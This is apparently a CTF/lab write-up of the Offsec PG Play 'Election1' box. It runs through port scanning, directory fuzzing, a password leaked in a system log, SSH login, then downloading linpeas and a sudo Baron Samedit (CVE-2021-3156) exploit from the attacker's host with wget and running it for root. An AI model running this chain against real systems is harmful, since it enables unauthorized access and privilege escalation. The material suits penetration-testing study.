###### tags: `Offsec` `PG Play` `Easy` `Linux`

#  Election1
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.163.211 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.163.211:22
Open 192.168.163.211:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoqt4FP0lhkJ0tTiMEUrVqRIcNKgQK22LJCOIVa1yoZf+bgOqsR4mIDjgpaJm/SDrAzRhVlD1dL6apkv7T7iceuo5QDXYvRLWS+PfsEaGwGpEVtpTCl/BjDVVtohdzgErXS69pJhgo9a1yNgVrH/W2SUE1b36ODSNqVb690+aP6jjJdyh2wi8GBlNMXBy6V5hR/qmFC55u7F/z5oG1tZxeZpDHbgdM94KRO9dR0WfKDIBQGa026GGcXtN10wtui2UHo65/6WgIG1LxgjppvOQUBMzj1SHuYqnKQLZyQ18E8oxLZTjc6OC898TeYMtyyKW0viUzeaqFxXPDwdI6G91J
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=
|   256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfCRDfwNshxW7uRiu76SMZx2hg865qS6TApHhvwKSH5
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`ffuf`掃路徑
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.163.211/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/common.txt 

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4640ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4641ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4645ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 61ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 60ms]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 64ms]
phpinfo.php             [Status: 200, Size: 95504, Words: 4715, Lines: 1170, Duration: 69ms]
robots.txt              [Status: 200, Size: 30, Words: 1, Lines: 5, Duration: 62ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 60ms]
:: Progress: [4727/4727] :: Job [1/1] :: 630 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

查看`http://192.168.163.211/robots.txt`
```
admin
wordpress
user
election
```

只有`http://192.168.163.211/election`可以進去，繼續`ffuf`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.163.211/election/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/common.txt --recursion -fc 403

[INFO] Adding a new job to the queue: http://192.168.163.211/election/media/cache/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/themes/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/ajax/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/components/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/css/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/img/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/inc/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/js/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/logs/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/admin/plugins/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/media/backgrounds/FUZZ

[INFO] Starting queued job on target: http://192.168.163.211/election/media/cache/FUZZ
```

前往`http://192.168.163.211/election/admin/logs/`下載`system.log`
```
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
```

用`love/P@$$w0rd@123`登入ssh，在`/home/love`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh love@192.168.163.211 

love@192.168.163.211's password: P@$$w0rd@123

love@election:~$ cat local.txt
e81d3837536fe2582c4154e33570bbd3
```

`linpeas.sh`
```
love@election:~$ wget 192.168.45.212/linpeas.sh
love@election:~$ chmod +x linpeas.sh
love@election:~$ ./linpeas.sh

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

用[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)得root，在/root得proof.txt
```
love@election:~$ wget 192.168.45.212/exploit_nss.py
love@election:~$ python3 exploit_nss.py
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@election:/root# cat proof.txt
946283e56080d5f7f2855432539c71c3
```